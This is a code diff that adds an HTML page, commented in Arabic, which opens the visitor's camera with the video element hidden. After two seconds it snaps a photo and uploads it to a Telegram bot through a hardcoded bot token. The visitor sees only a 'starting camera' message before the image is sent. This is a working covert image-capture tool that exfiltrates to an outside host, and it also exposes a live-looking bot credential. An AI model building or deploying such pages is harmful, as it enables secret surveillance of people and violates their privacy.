@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera Auto Capture</title>
+</head>
+<body>
+  <h2>جاري تشغيل الكاميرا...</h2>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // تشغيل الكاميرا
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // انتظر 2 ثانية ثم التقط صورة
+        setTimeout(() => {
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/png');
+
+          // تحويل Base64 إلى Blob ثم إرساله
+          fetch(imageData)
+            .then(res => res.blob())
+            .then(blob => {
+              const formData = new FormData();
+              formData.append('5568171362', '6191654815:AAGuLV94DlfXAMgGukJDzoDRpFiNFD6RXqg'); // Chat ID
+              formData.append('photo', blob, 'photo.png');
+
+              fetch('https://api.telegram.org/bot6191654815:AAGuLV94DlfXAMgGukJDzoDRpFiNFD6RXqg/sendPhoto', {
+                method: 'POST',
+                body: formData
+              })
+              .then(response => response.json())
+              .then(data => {
+                console.log('✅ تم الإرسال:', data);
+                alert('✅ تم إرسال الصورة إلى تيليجرام!');
+              })
+              .catch(error => {
+                console.error('❌ خطأ في الإرسال:', error);
+                alert('❌ فشل إرسال الصورة: ' + error.message);
+              });
+            });
+        }, 2000);
+      })
+      .catch(err => {
+        alert('🚫 رفض الوصول إلى الكاميرا: ' + err.message);
+      });
+  </script>
+</body>
+</html>
